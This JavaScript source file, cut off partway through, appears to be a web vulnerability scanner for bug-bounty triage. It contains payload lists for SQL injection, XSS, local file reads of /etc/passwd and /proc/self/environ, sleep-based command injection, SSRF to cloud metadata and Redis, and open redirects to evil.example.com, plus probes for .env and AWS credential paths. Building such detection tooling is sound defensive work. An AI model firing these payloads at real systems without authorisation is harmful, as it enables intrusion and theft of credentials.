/**
 * YORU deep web vulnerability scanner.
 *
 * Non-destructive but very thorough. Designed for bug-bounty triage on
 * targets the operator has explicit permission to test. Every probe is
 * safe-by-default: no destructive HTTP verbs, no auth brute force, no
 * uploads, small payloads, tight timeouts, adaptive concurrency.
 *
 * What it does:
 *   - Baseline fetch + follow redirects
 *   - robots.txt / sitemap.xml crawl seed + light in-scope crawl
 *   - HTML form discovery (GET + POST) + JSON API endpoint discovery
 *   - Per-parameter probes: SQLi (error + boolean + time), XSS (reflected +
 *     context-aware), LFI / path traversal, command injection (time-based),
 *     SSRF markers, open redirect, SSTI, XXE hints, CRLF/header injection,
 *     NoSQL injection, HTTP parameter pollution, prototype-pollution query
 *   - Auth & session: cookie flags, JWT `alg=none` hint, session fixation
 *     hint, missing CSRF tokens on POST forms
 *   - Transport & headers: HSTS/CSP/XFO/XCTO/Referrer/Permissions,
 *     dangerous CSP directives, CORS misconfig (Origin reflection,
 *     credentials + wildcard), clickjacking, cache-control on private
 *     responses, subdomain-takeover fingerprints
 *   - Content: mixed content, secrets in JS bundles (AWS keys, GCP,
 *     Slack tokens, Stripe keys, JWTs, PEM blocks), source maps, .well-known
 *   - Infrastructure: exposed paths (env, git, backups, admin, actuator,
 *     phpinfo, wp-admin, Jenkins, Grafana, Kubernetes, Swagger), directory
 *     listing, method allow-list, TRACE, PUT
 *   - Software fingerprint (server, x-powered-by, generators, Wappalyzer-lite)
 *     + NVD CVE lookup with CVSS + description
 *
 * All findings are normalized to:
 *   { id, type, severity, confidence, title, description, evidence, url,
 *     param?, path?, payload?, remediation, references[] }
 *
 * Severity: info | low | medium | high | critical
 * Confidence: low | medium | high
 */

import { URL } from "node:url";
import { randomBytes, createHash } from "node:crypto";
import {
  EXTRA_PATHS, EXTRA_SECRETS,
  probeGraphQL, scanJwts, probeHostHeader, probeCachePoisoning,
  smugglingIndicators, probeProtoPollution, scanDomSinks,
  subdomainEnum, detectWebsocket, probeFormBodies, probeExtraMethods,
} from "./vuln-scan-extra.js";

const UA = "YORU-DeepScan/2.1 (+bug-bounty; contact: owner)";
const TIMEOUT_MS = 15_000;
const MAX_BODY_BYTES = 800_000;
const MAX_CRAWL_PAGES = 60;
const MAX_PARAM_PROBES = 120;
const CONCURRENCY = 8;

const MARKER = () => "yoru" + randomBytes(4).toString("hex");

// ────────────────────────────── HTTP core ──────────────────────────────

async function timedFetch(url, init = {}) {
  return fetch(url, {
    redirect: "follow",
    ...init,
    headers: { "user-agent": UA, accept: "*/*", ...(init.headers || {}) },
    signal: AbortSignal.timeout(TIMEOUT_MS),
  });
}

async function fetchWithTiming(url, init) {
  const t0 = Date.now();
  try {
    const res = await timedFetch(url, init);
    const buf = await res.arrayBuffer();
    const text = Buffer.from(buf).slice(0, MAX_BODY_BYTES).toString("utf8");
    return {
      ok: true, status: res.status, url: res.url,
      headers: Object.fromEntries(res.headers.entries()),
      body: text, timeMs: Date.now() - t0, size: buf.byteLength,
    };
  } catch (err) {
    return { ok: false, error: err.message, timeMs: Date.now() - t0 };
  }
}

async function pool(items, worker, limit = CONCURRENCY) {
  const results = [];
  let i = 0;
  const runners = new Array(Math.min(limit, items.length)).fill(0).map(async () => {
    while (i < items.length) {
      const idx = i++;
      try { results[idx] = await worker(items[idx], idx); }
      catch (e) { results[idx] = { error: e.message }; }
    }
  });
  await Promise.all(runners);
  return results;
}

const hash = (s) => createHash("sha1").update(s).digest("hex").slice(0, 10);

// ─────────────────────────── finding factory ───────────────────────────

function mkFinding(f) {
  const base = {
    id: hash(`${f.type}|${f.url || ""}|${f.param || ""}|${f.path || ""}`),
    severity: "info",
    confidence: "medium",
    references: [],
    remediation: "",
    ...f,
  };
  return base;
}

// ───────────────────────── payload catalogues ─────────────────────────

const SQLI_PAYLOADS = [
  `'`, `"`, `\``, `\\`, `%27`, `%2527`,
  `' OR '1'='1`, `" OR "1"="1`, `1)) OR 1=1--`, `') OR ('1'='1`,
  `' OR 1=1-- -`, `admin'--`, `admin'/*`, `' UNION SELECT NULL--`,
  `' UNION SELECT NULL,NULL--`, `' UNION SELECT NULL,NULL,NULL--`,
  `' AND SLEEP(0)--`, `';SELECT pg_sleep(0)--`,
  `'/**/OR/**/1=1--`, `'%09OR%091=1--`, `'||'a'='a`,
];
const SQLI_TIME_PAYLOADS = [
  { p: `';SELECT pg_sleep(5)--`, engine: "postgres" },
  { p: `' OR SLEEP(5)-- -`, engine: "mysql" },
  { p: `';WAITFOR DELAY '0:0:5'--`, engine: "mssql" },
  { p: `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--`, engine: "oracle" },
  { p: `'||pg_sleep(5)||'`, engine: "postgres" },
  { p: `'/**/AND/**/SLEEP(5)#`, engine: "mysql" },
];
const SQLI_BOOL_PAIRS = [
  { t: `' AND '1'='1`, f: `' AND '1'='2` },
  { t: `") AND ("1"="1`, f: `") AND ("1"="2` },
];
const SQLI_ERRORS = [
  /you have an error in your sql syntax/i, /warning:\s*mysql/i,
  /unclosed quotation mark after the character string/i,
  /quoted string not properly terminated/i,
  /pg_query\(\)|postgresql.*ERROR|PostgreSQL query failed/i,
  /sqlite3?::(?:exception|error)/i, /ORA-\d{5}/i,
  /odbc.*sql server/i, /native client.*error/i,
  /System\.Data\.SqlClient\.SqlException/i, /MySqlClient\./i,
  /valid MySQL result/i, /SQLSTATE\[/i,
];

const XSS_PAYLOADS = (m) => [
  { p: `<svg/onload=alert(1)>${m}`, ctx: "html" },
  { p: `"><script>${m}</script>`, ctx: "attr" },
  { p: `'><img src=x onerror=${m}>`, ctx: "attr-single" },
  { p: `javascript:${m}`, ctx: "url" },
  { p: `${m}"-alert(1)-"`, ctx: "js" },
  { p: `<iframe srcdoc="<script>${m}</script>">`, ctx: "html" },
  { p: `<details/open/ontoggle=alert(1)>${m}`, ctx: "html" },
  { p: `"><svg><animate onbegin=alert(1) attributeName=x></svg>${m}`, ctx: "attr" },
  { p: `<img src=x onerror=confirm\`1\`>${m}`, ctx: "html-nobracket" },
];

const LFI_PAYLOADS = [
  "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
  "....//....//....//etc/passwd", "/etc/passwd%00",
  "..\\..\\..\\windows\\win.ini", "C:\\windows\\win.ini",
  "php://filter/convert.base64-encode/resource=index",
  "..%252f..%252f..%252fetc%252fpasswd",
  "/proc/self/environ", "/proc/self/cmdline",
  "expect://id", "data://text/plain,YORU",
];
const LFI_MARKERS = [/root:x:0:0:/i, /\[extensions\]/i, /for 16-bit app support/i, /PD9waHA/];

const CMDI_PAYLOADS = [
  { p: `; sleep 5`, sec: 5 }, { p: `| sleep 5`, sec: 5 },
  { p: "`sleep 5`", sec: 5 }, { p: `$(sleep 5)`, sec: 5 },
  { p: `& ping -n 5 127.0.0.1`, sec: 5 },
];

const SSRF_PAYLOADS = [
  "http://127.0.0.1:80/", "http://169.254.169.254/latest/meta-data/",
  "http://[::1]/", "http://localhost:22/", "file:///etc/passwd",
  "gopher://127.0.0.1:6379/_INFO",
];

const OPEN_REDIRECT_PAYLOADS = [
  "https://evil.example.com/", "//evil.example.com",
  "/\\evil.example.com", "https:%2f%2fevil.example.com",
];

const SSTI_PAYLOADS = [
  { p: "{{7*7}}", m: "49" }, { p: "${7*7}", m: "49" },
  { p: "<%= 7*7 %>", m: "49" }, { p: "#{7*7}", m: "49" },
  { p: "{{ 7*'7' }}", m: "7777777" },
];

const CRLF_PAYLOADS = [
  "%0d%0aSet-Cookie:%20yoru=1", "%0d%0aX-Yoru-Injected:%201",
];

const NOSQL_PAYLOADS = [
  `'||'1'=='1`, `';return true;var x='`,
  `{"$ne":null}`, `{"$gt":""}`,
];

const SECURITY_HEADERS = {
  "content-security-policy": { sev: "medium", why: "no CSP → XSS defense-in-depth missing" },
  "strict-transport-security": { sev: "medium", why: "no HSTS → downgrade attacks possible" },
  "x-content-type-options": { sev: "low", why: "no X-Content-Type-Options → MIME sniffing" },
  "x-frame-options": { sev: "low", why: "no XFO (and no CSP frame-ancestors) → clickjacking" },
  "referrer-policy": { sev: "low", why: "no Referrer-Policy → URL leakage" },
  "permissions-policy": { sev: "info", why: "no Permissions-Policy → broad feature access" },
  "cross-origin-opener-policy": { sev: "info", why: "no COOP → Spectre-class isolation weak" },
  "cross-origin-resource-policy": { sev: "info", why: "no CORP → cross-origin embedding open" },
};

const COMMON_PATHS = [
  "/.env", "/.env.local", "/.env.production", "/.env.bak",
  "/.git/config", "/.git/HEAD", "/.git/logs/HEAD", "/.gitignore",
  "/.svn/entries", "/.hg/store", "/.DS_Store",
  "/wp-config.php.bak", "/wp-config.php~", "/wp-config.old",
  "/config.json", "/config.yml", "/config.yaml", "/config.php.bak",
  "/backup.zip", "/backup.sql", "/backup.tar.gz", "/db.sql", "/dump.sql",
  "/phpinfo.php", "/info.php", "/test.php",
  "/server-status", "/server-info",
  "/actuator", "/actuator/env", "/actuator/health", "/actuator/heapdump", "/actuator/mappings",
  "/api", "/api/", "/api/v1", "/api/v2", "/graphql", "/graphiql",
  "/debug", "/debug/vars", "/console", "/_console",
  "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
  "/swagger.json", "/swagger-ui.html", "/openapi.json", "/openapi.yaml",
  "/wp-admin/", "/wp-login.php", "/xmlrpc.php",
  "/admin/", "/administrator/", "/admin.php", "/login", "/portal",
  "/jenkins/", "/manager/html", "/solr/", "/grafana/",
  "/metrics", "/prometheus", "/kubernetes/", "/kubelet/",
  "/.aws/credentials", "/aws.json", "/gcp.json",
  "/composer.json", "/composer.lock", "/package.json", "/yarn.lock",
  "/webpack.config.js", "/vite.config.js",
  ...EXTRA_PATHS,
];

const SECRET_PATTERNS = [
  { name: "AWS access key", r: /AKIA[0-9A-Z]{16}/g, sev: "critical" },
  { name: "AWS secret key", r: /aws(.{0,20})?(secret|access)[^"']{0,20}["'][A-Za-z0-9\/+=]{40}["']/gi, sev: "critical" },
  { name: "GCP service key", r: /"type":\s*"service_account"/g, sev: "critical" },
  { name: "Google API key", r: /AIza[0-9A-Za-z_\-]{35}/g, sev: "high" },
  { name: "Slack token", r: /xox[baprs]-[A-Za-z0-9-]{10,}/g, sev: "high" },
  { name: "Stripe live key", r: /sk_live_[0-9a-zA-Z]{24,}/g, sev: "critical" },
  { name: "Stripe restricted key", r: /rk_live_[0-9a-zA-Z]{24,}/g, sev: "critical" },
  { name: "GitHub token", r: /gh[pousr]_[A-Za-z0-9]{36,}/g, sev: "critical" },
  { name: "PEM private key", r: /-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/g, sev: "critical" },
  { name: "JWT", r: /eyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}/g, sev: "medium" },
  { name: "Mongo URI", r: /mongodb(?:\+srv)?:\/\/[^\s"']+/g, sev: "high" },
  { name: "Postgres URI", r: /postgres(?:ql)?:\/\/[^\s"']+/g, sev: "high" },
  { name: "Redis URI", r: /redis:\/\/[^\s"']+/g, sev: "medium" },
  ...EXTRA_SECRETS,
];

// ────────────────────────── discovery ──────────────────────────

function normalize(target) {
  if (!/^https?:\/\//i.test(target)) target = "https://" + target;
  return new URL(target);
}

function sameHost(a, b) {
  try { return new URL(a).host === new URL(b).host; } catch { return false; }
}

function extractLinks(base, html) {
  const links = new Set();
  const re = /(?:href|src|action)\s*=\s*["']([^"'#]+)["']/gi;
  let m;
  while ((m = re.exec(html))) {
    try {
      const u = new URL(m[1], base);
      if (/^https?:$/.test(u.protocol)) links.add(u.toString().split("#")[0]);
    } catch {}
  }
  return [...links];
}

function extractForms(base, html) {
  const forms = [];
  const formRe = /<form\b([^>]*)>([\s\S]*?)<\/form>/gi;
  let fm;
  while ((fm = formRe.exec(html))) {
    const attrs = fm[1] || ""; const inner = fm[2] || "";
    const action = /action\s*=\s*["']([^"']*)["']/i.exec(attrs)?.[1] || "";
    const method = (/method\s*=\s*["']([^"']*)["']/i.exec(attrs)?.[1] || "get").toLowerCase();
    const inputs = [];
    const inRe = /<(?:input|textarea|select)\b([^>]*)>/gi;
    let im;
    while ((im = inRe.exec(inner))) {
      const a = im[1] || "";
      const name = /name\s*=\s*["']([^"']+)["']/i.exec(a)?.[1];
      const type = /type\s*=\s*["']([^"']+)["']/i.exec(a)?.[1] || "text";
      if (name) inputs.push({ name, type });
    }
    let actionUrl;
    try { actionUrl = new URL(action || "", base).toString(); } catch { actionUrl = base; }
    const hasCsrf = inputs.some((i) => /csrf|xsrf|_token|authenticity/i.test(i.name));
    forms.push({ action: actionUrl, method, inputs, hasCsrf });
  }
  return forms;
}

async function crawl(startUrl, onNote) {
  const start = new URL(startUrl);
  const seen = new Set([start.toString()]);
  const queue = [start.toString()];
  const pages = [];
  while (queue.length && pages.length < MAX_CRAWL_PAGES) {
    const batch = queue.splice(0, CONCURRENCY);
    const fetched = await pool(batch, (u) => fetchWithTiming(u));
    for (let i = 0; i < batch.length; i++) {
      const url = batch[i]; const r = fetched[i];
      if (!r?.ok) continue;
      pages.push({ url, ...r });
      onNote?.(`crawled ${new URL(url).pathname} (${r.status})`);
      const links = extractLinks(url, r.body).filter((l) => sameHost(l, start.toString()));
      for (const l of links) {
        if (!seen.has(l) && seen.size < MAX_CRAWL_PAGES * 3) {
          seen.add(l); queue.push(l);
        }
      }
    }
  }
  // seed with robots.txt / sitemap
  const seedFiles = ["/robots.txt", "/sitemap.xml"];
  for (const p of seedFiles) {
    const r = await fetchWithTiming(new URL(p, start).toString());
    if (r.ok && r.status === 200) {
      const urls = [...r.body.matchAll(/https?:\/\/[^\s<>"']+/g)].map((m) => m[0]);
      for (const u of urls.slice(0, 20)) {
        if (sameHost(u, start.toString()) && !seen.has(u) && pages.length < MAX_CRAWL_PAGES) {
          seen.add(u);
          const rr = await fetchWithTiming(u);
          if (rr.ok) { pages.push({ url: u, ...rr }); onNote?.(`sitemap → ${new URL(u).pathname}`); }
        }
      }
    }
  }
  return pages;
}

// ────────────────────────── analyzers ──────────────────────────

function fingerprintSoftware(headers, body) {
  const hits = [];
  const push = (type, value) => value && hits.push({ type, value });
  push("server", headers["server"]);
  push("x-powered-by", headers["x-powered-by"]);
  push("via", headers["via"]);
  push("x-aspnet-version", headers["x-aspnet-version"]);
  push("x-generator", headers["x-generator"]);
  const gen = /<meta[^>]+name=["']generator["'][^>]+content=["']([^"']+)/i.exec(body)?.[1];
  push("generator", gen);
  const tech = [
    ["WordPress", /wp-content|wp-includes|wp-json/i],
    ["Drupal", /drupal-settings-json|drupal\.js/i],
    ["Joomla", /\/media\/system\/js\/|joomla/i],
    ["Magento", /Mage\.Cookies|mage-init/i],
    ["Shopify", /cdn\.shopify\.com/i],
    ["Laravel", /laravel_session/i, headers["set-cookie"]],
    ["Django", /csrftoken|sessionid/i, headers["set-cookie"]],
    ["Rails", /_rails|X-Runtime/i, JSON.stringify(headers)],
    ["Express", /^Express/i, headers["x-powered-by"]],
    ["Next.js", /_next\/static/i],
    ["Nuxt", /_nuxt\//i],
    ["React", /data-reactroot|__NEXT_DATA__/i],
    ["Vue", /data-v-[a-f0-9]{8}/i],
    ["Angular", /ng-version=/i],
    ["jQuery", /jquery(?:-[\d.]+)?\.min\.js/i],
    ["Cloudflare", /__cfduid|cf-ray/i, JSON.stringify(headers)],
    ["Akamai", /AkamaiGHost/i, JSON.stringify(headers)],
    ["Nginx", /^nginx/i, headers["server"]],
    ["Apache", /^Apache/i, headers["server"]],
    ["IIS", /Microsoft-IIS/i, headers["server"]],
  ];
  for (const [name, rx, src] of tech) if (rx.test(src || body)) hits.push({ type: "tech", value: name });
  return dedupe(hits, (h) => h.type + h.value);
}

function dedupe(arr, key) {
  const seen = new Set(); const out = [];
  for (const x of arr) { const k = key(x); if (!seen.has(k)) { seen.add(k); out.push(x); } }
  return out;
}

function analyzeHeaders(url, headers) {
  const findings = [];
  for (const [h, meta] of Object.entries(SECURITY_HEADERS)) {
    if (!headers[h]) {
      findings.push(mkFinding({
        type: "missing-security-header", severity: meta.sev, confidence: "high",
        title: `Missing ${h}`, description: meta.why, url,
        remediation: `Set the ${h} response header on all HTML responses.`,
      }));
    }
  }
  // CSP quality
  const csp = headers["content-security-policy"];
  if (csp) {
    if (/unsafe-inline/i.test(csp)) findings.push(mkFinding({
      type: "weak-csp", severity: "medium", confidence: "high", url,
      title: "CSP allows 'unsafe-inline'", description: "Inline scripts/styles allowed — XSS mitigation bypassed.",
      evidence: csp.slice(0, 300), remediation: "Remove 'unsafe-inline'; use nonces or hashes.",
    }));
    if (/\*\s*(?:;|$)/.test(csp)) findings.push(mkFinding({
      type: "weak-csp", severity: "medium", confidence: "medium", url,
      title: "CSP uses wildcard source", description: "Wildcard source allows any origin.",
      evidence: csp.slice(0, 300),
    }));
  }
  // HSTS quality
  const hsts = headers["strict-transport-security"];
  if (hsts) {
    const maxAge = /max-age=(\d+)/i.exec(hsts)?.[1];
    if (maxAge && Number(maxAge) < 15552000) findings.push(mkFinding({
      type: "weak-hsts", severity: "low", url,
      title: "HSTS max-age too short",
      description: `max-age=${maxAge} — below the recommended 15552000 (6 months).`,
    }));
  }
  // Cookies
  const rawCookies = String(headers["set-cookie"] || "").split(/,(?=[^ ])/).filter(Boolean);
  for (const c of rawCookies) {
    const name = c.split("=")[0]; const missing = [];
    if (!/;\s*httponly/i.test(c)) missing.push("HttpOnly");
    if (!/;\s*secure/i.test(c)) missing.push("Secure");
    if (!/;\s*samesite/i.test(c)) missing.push("SameSite");
    if (missing.length) findings.push(mkFinding({
      type: "cookie-flags", severity: /session|auth|token|sid/i.test(name) ? "high" : "medium",
      confidence: "high", url, title: `Cookie ${name} missing ${missing.join(", ")}`,
      description: `Session-like cookies without these flags are vulnerable to theft or CSRF.`,
      evidence: c.slice(0, 200),
      remediation: "Set HttpOnly; Secure; SameSite=Lax or Strict on session cookies.",
    }));
  }
  // CORS
  const acao = headers["access-control-allow-origin"];
  const acac = headers["access-control-allow-credentials"];
  if (acao === "*" && /true/i.test(acac || "")) findings.push(mkFinding({
    type: "cors-misconfig", severity: "high", confidence: "high", url,
    title: "CORS wildcard with credentials",
    description: "Access-Control-Allow-Origin: * combined with credentials leaks authenticated data.",
    evidence: `ACAO=${acao} ACAC=${acac}`,
    remediation: "Never combine ACAO=* with credentials. Reflect a strict allow-list of trusted origins.",
  }));
  // Clickjacking (no XFO + no CSP frame-ancestors)
  const fa = /frame-ancestors\s+[^;]+/i.test(csp || "");
  if (!headers["x-frame-options"] && !fa) findings.push(mkFinding({
    type: "clickjacking", severity: "medium", url,
    title: "Clickjacking possible",
    description: "No X-Frame-Options and no CSP frame-ancestors directive — page can be framed.",
    remediation: "Set X-Frame-Options: DENY or CSP frame-ancestors 'self'.",
  }));
  return findings;
}

function scanBodyForSecrets(url, body) {
  const findings = [];
  for (const p of SECRET_PATTERNS) {
    const seen = new Set();
    let m; const r = new RegExp(p.r);
    while ((m = r.exec(body)) && seen.size < 3) {
      const snip = m[0].slice(0, 60);
      if (seen.has(snip)) continue; seen.add(snip);
      findings.push(mkFinding({
        type: "exposed-secret", severity: p.sev, confidence: "medium", url,
        title: `Possible ${p.name} in response body`,
        description: `Response contains a token that matches ${p.name} pattern. Verify before reporting.`,
        evidence: snip, remediation: "Rotate the credential and remove it from client-served files.",
      }));
    }
  }
  // Source map hint
  const sm = /\/\/[#@]\s*sourceMappingURL\s*=\s*(\S+)/.exec(body);
  if (sm) findings.push(mkFinding({
    type: "source-map", severity: "low", url,
    title: "Source map exposed",
    description: `sourceMappingURL points to ${sm[1]} — original source may be downloadable.`,
    remediation: "Do not ship source maps to production, or restrict access.",
  }));
  return findings;
}

// ─────────────────── param probes (SQLi/XSS/etc) ───────────────────

const COMMON_PARAM_NAMES = [
  "id", "uid", "user_id", "user", "username",
  "q", "query", "search", "s",
  "page", "p", "cat", "category",
  "item", "productid", "pid",
  "file", "path", "include", "template", "view",
  "action", "cmd", "lang",
  "redirect", "url", "next", "return", "callback",
];

/**
 * If URL has no params, synthesize guessed-param variants so we still
 * exercise SQLi/XSS on endpoints that only reveal params via JS/routing.
 * Guessed variants are only produced when explicitly requested (base URL only)
 * to avoid combinatorial blow-up across every crawled page.
 */
function buildProbeVariants(url, { allowGuess = false } = {}) {
  const u = new URL(url);
  const existing = [...u.searchParams.keys()];
  if (existing.length) return [{ url: u.toString(), keys: existing, guessed: false }];
  if (!allowGuess) return [];
  return COMMON_PARAM_NAMES.map((name) => {
    const g = new URL(u.toString());
    g.searchParams.set(name, "1");
    return { url: g.toString(), keys: [name], guessed: true };
  });
}


function withParam(urlStr, key, value) {
  const u = new URL(urlStr);
  u.searchParams.set(key, value);
  return u.toString();
}

/**
 * Test one parameter across every vuln class. Payloads are APPENDED to the
 * original value so the surrounding SQL/HTML/template context stays intact
 * — the single most important correctness fix for real-world targets.
 */
async function probeOneParam(baseUrlStr, key, baseline, onNote, opts = {}) {
  const findings = [];
  const orig = new URL(baseUrlStr).searchParams.get(key) ?? "1";
  const guessed = !!opts.guessed;

  const benignUrl = withParam(baseUrlStr, key, orig || "1");
  const benign = await fetchWithTiming(benignUrl);
  if (!benign.ok) return findings;
  const benignLen = benign.body.length;
  const benignStatus = benign.status;

  // ── SQLi: error / status-flip / length-diff, appended to original ──
  const quote = await fetchWithTiming(withParam(baseUrlStr, key, `${orig}'`));
  const dbl = await fetchWithTiming(withParam(baseUrlStr, key, `${orig}''`));
  let sqliHit = null;
  if (quote.ok) {
    const err = SQLI_ERRORS.find((rx) => rx.test(quote.body));
    if (err) {
      sqliHit = mkFinding({
        type: "sqli-error", severity: "high", confidence: "high",
        title: `SQL error reflected on ?${key}`, url: quote.url,
        param: key, payload: `${orig}'`,
        description: "Appending a single quote to the parameter triggered a database error — classic SQL injection.",
        evidence: (quote.body.match(err) || [""])[0].slice(0, 240),
        remediation: "Use parameterized queries.",
        references: ["https://owasp.org/www-community/attacks/SQL_Injection"],
      });
    } else if (
      dbl.ok && quote.status >= 500 && benignStatus < 500 && dbl.status < 500
    ) {
      sqliHit = mkFinding({
        type: "sqli-status", severity: "high", confidence: "medium",
        title: `Server error on quote injection ?${key}`, url: quote.url,
        param: key, payload: `${orig}'`,
        description: `Appending "'" flips status ${benignStatus}→${quote.status}, escaped "''" returns ${dbl.status}. Strong SQLi indicator.`,
        remediation: "Parameterize the query.",
      });
    } else if (
      dbl.ok &&
      Math.abs(quote.body.length - benignLen) > Math.max(150, benignLen * 0.15) &&
      Math.abs(dbl.body.length - benignLen) < Math.max(80, benignLen * 0.05)
    ) {
      sqliHit = mkFinding({
        type: "sqli-diff", severity: "high", confidence: "medium",
        title: `Response differential on quote injection ?${key}`, url: quote.url,
        param: key, payload: `${orig}'`,
        description: `Body length benign=${benignLen}, "'"=${quote.body.length}, "''"=${dbl.body.length}. Injection breaks the query, escaping restores it.`,
        remediation: "Parameterize the query.",
      });
    }
  }
  if (sqliHit) { findings.push(sqliHit); onNote?.(`sqli on ?${key} (${sqliHit.type})`); }

  // ── SQLi: boolean-based (appended) ──
  {
    const uT = withParam(baseUrlStr, key, `${orig}' AND '1'='1`);
    const uF = withParam(baseUrlStr, key, `${orig}' AND '1'='2`);
    const [rT, rF] = await Promise.all([fetchWithTiming(uT), fetchWithTiming(uF)]);
    if (rT.ok && rF.ok) {
      const dt = Math.abs(rT.body.length - rF.body.length);
      const trueClose = Math.abs(rT.body.length - benignLen) < Math.max(80, benignLen * 0.05);
      const falseFar = Math.abs(rF.body.length - benignLen) > Math.max(150, benignLen * 0.15);
      if (dt > Math.max(150, benignLen * 0.15) && (trueClose || falseFar)) {
        findings.push(mkFinding({
          type: "sqli-boolean", severity: "high", confidence: "medium",
          url: uT, param: key, payload: `${orig}' AND '1'='1 vs '2`,
          title: `Boolean-based SQLi indicator on ?${key}`,
          description: `TRUE matches benign (${rT.body.length}~${benignLen}); FALSE differs (${rF.body.length}). Blind SQLi likely.`,
          remediation: "Parameterize the query.",
        }));
        onNote?.(`blind sqli on ?${key}`);
      }
    }
    if (/^\d+$/.test(orig)) {
      const nT = withParam(baseUrlStr, key, `${orig} AND 1=1`);
      const nF = withParam(baseUrlStr, key, `${orig} AND 1=2`);
      const [rnT, rnF] = await Promise.all([fetchWithTiming(nT), fetchWithTiming(nF)]);
      if (rnT.ok && rnF.ok && Math.abs(rnT.body.length - rnF.body.length) > Math.max(150, benignLen * 0.15)) {
        findings.push(mkFinding({
          type: "sqli-boolean", severity: "high", confidence: "medium",
          url: nT, param: key, payload: `${orig} AND 1=1 vs 1=2`,
          title: `Numeric boolean SQLi indicator on ?${key}`,
          description: `Numeric TRUE/FALSE payloads differ (${rnT.body.length} vs ${rnF.body.length}).`,
          remediation: "Parameterize the query.",
        }));
        onNote?.(`numeric blind sqli on ?${key}`);
      }
    }
  }

  // ── XSS reflected (append + full replace) ──
  {
    const m = MARKER();
    for (const { p, ctx } of XSS_PAYLOADS(m)) {
      let done = false;
      for (const v of [`${orig}${p}`, p]) {
        const t = withParam(baseUrlStr, key, v);
        const r = await fetchWithTiming(t);
        if (!r.ok) continue;
        if (r.body.includes(p)) {
          findings.push(mkFinding({
            type: "xss-reflected", severity: "high", confidence: "high",
            url: t, param: key, payload: v,
            title: `Reflected XSS on ?${key} (${ctx} context)`,
            description: "Payload returned verbatim in response body — no encoding.",
            evidence: `context=${ctx}`,
            remediation: "Contextually encode output. Add a strict CSP without 'unsafe-inline'.",
            references: ["https://owasp.org/www-community/attacks/xss/"],
          }));
          onNote?.(`reflected XSS on ?${key}`);
          done = true; break;
        } else if (r.body.includes(m) && !benign.body.includes(m)) {
          findings.push(mkFinding({
            type: "xss-partial", severity: "medium", confidence: "medium",
            url: t, param: key, payload: v,
            title: `Partial reflection on ?${key}`,
            description: "Marker reflected but payload partially encoded — worth manual review.",
          }));
        }
      }
      if (done) break;
    }
  }

  // Skip expensive server-side probes on GUESSED params
  if (guessed) return findings;

  // ── Open redirect ──
  for (const rd of OPEN_REDIRECT_PAYLOADS) {
    const t = withParam(baseUrlStr, key, rd);
    const r = await fetch(t, { redirect: "manual", signal: AbortSignal.timeout(TIMEOUT_MS), headers: { "user-agent": UA } }).catch(() => null);
    if (r && [301, 302, 303, 307, 308].includes(r.status)) {
      const loc = r.headers.get("location") || "";
      if (/evil\.example\.com/i.test(loc)) {
        findings.push(mkFinding({
          type: "open-redirect", severity: "medium", confidence: "high",
          url: t, param: key, payload: rd,
          title: `Open redirect on ?${key}`,
          description: `Server issued ${r.status} to attacker Location: ${loc}`,
          remediation: "Restrict redirect targets to an allow-list.",
        }));
        onNote?.(`open redirect on ?${key}`); break;
      }
    }
  }

  // ── LFI ──
  for (const p of LFI_PAYLOADS.slice(0, 6)) {
    const t = withParam(baseUrlStr, key, p);
    const r = await fetchWithTiming(t);
    if (r.ok && LFI_MARKERS.some((rx) => rx.test(r.body))) {
      findings.push(mkFinding({
        type: "lfi", severity: "critical", confidence: "high",
        url: t, param: key, payload: p,
        title: `Local file inclusion on ?${key}`,
        description: "System file contents leaked through parameter.",
        evidence: r.body.match(/root:x:0:0:[^\n]{0,80}/i)?.[0] || "system file contents observed",
        remediation: "Validate against a strict allow-list of filenames.",
      }));
      onNote?.(`LFI on ?${key}`); break;
    }
  }

  // ── SSTI ──
  for (const { p, m } of SSTI_PAYLOADS.slice(0, 4)) {
    const t = withParam(baseUrlStr, key, p);
    const r = await fetchWithTiming(t);
    if (r.ok && r.body.includes(m) && !benign.body.includes(m)) {
      findings.push(mkFinding({
        type: "ssti", severity: "critical", confidence: "medium",
        url: t, param: key, payload: p,
        title: `Server-side template injection on ?${key}`,
        description: `Expression ${p} evaluated to ${m} in the response.`,
        remediation: "Do not render user input through a template engine.",
      }));
      onNote?.(`SSTI on ?${key}`); break;
    }
  }

  // ── Command injection (time-based) ──
  {
    const { p, sec } = CMDI_PAYLOADS[0];
    const t = withParam(baseUrlStr, key, `${orig}${p}`);
    const r = await fetchWithTiming(t);
    if (r.ok && r.timeMs >= sec * 1000 * 0.9) {
      findings.push(mkFinding({
        type: "cmdi-time", severity: "critical", confidence: "medium",
        url: t, param: key, payload: p,
        title: `Time-based command injection indicator on ?${key}`,
        description: `Response took ${r.timeMs}ms with sleep payload.`,
        remediation: "Never pass user input to shell execution.",
      }));
    }
  }

  // ── CRLF ──
  {
    const t = withParam(baseUrlStr, key, CRLF_PAYLOADS[0]);
    const r = await fetch(t, { redirect: "manual", signal: AbortSignal.timeout(TIMEOUT_MS), headers: { "user-agent": UA } }).catch(() => null);
    if (r && (r.headers.get("x-yoru-injected") || /yoru=1/.test(r.headers.get("set-cookie") || ""))) {
      findings.push(mkFinding({
        type: "crlf", severity: "high", confidence: "high",
        url: t, param: key, payload: CRLF_PAYLOADS[0],
        title: `CRLF / header injection on ?${key}`,
        description: "Newlines in the parameter created new response headers.",
        remediation: "Strip CR/LF from any user input used in headers or redirects.",
      }));
    }
  }

  // ── SQLi time-based ──
  {
    const { p, engine } = SQLI_TIME_PAYLOADS[0];
    const t = withParam(baseUrlStr, key, `${orig}${p}`);
    const r = await fetchWithTiming(t);
    if (r.ok && r.timeMs >= 4500) {
      findings.push(mkFinding({
        type: "sqli-time", severity: "critical", confidence: "medium",
        url: t, param: key, payload: p,
        title: `Time-based SQLi indicator on ?${key} (${engine})`,
        description: `Response took ${r.timeMs}ms with a sleep payload.`,
        remediation: "Parameterize the query.",
      }));
    }
  }

  return findings;
}

async function probeParamsOnUrl(url, baseline, onNote, opts = {}) {
  const variants = buildProbeVariants(url, { allowGuess: !!opts.allowGuess });
  const all = [];
  const tasks = [];
  for (const v of variants) {
    for (const key of v.keys) {
      tasks.push({ v, key });
    }
  }
  if (!tasks.length) return all;
  const label = new URL(url).pathname || "/";
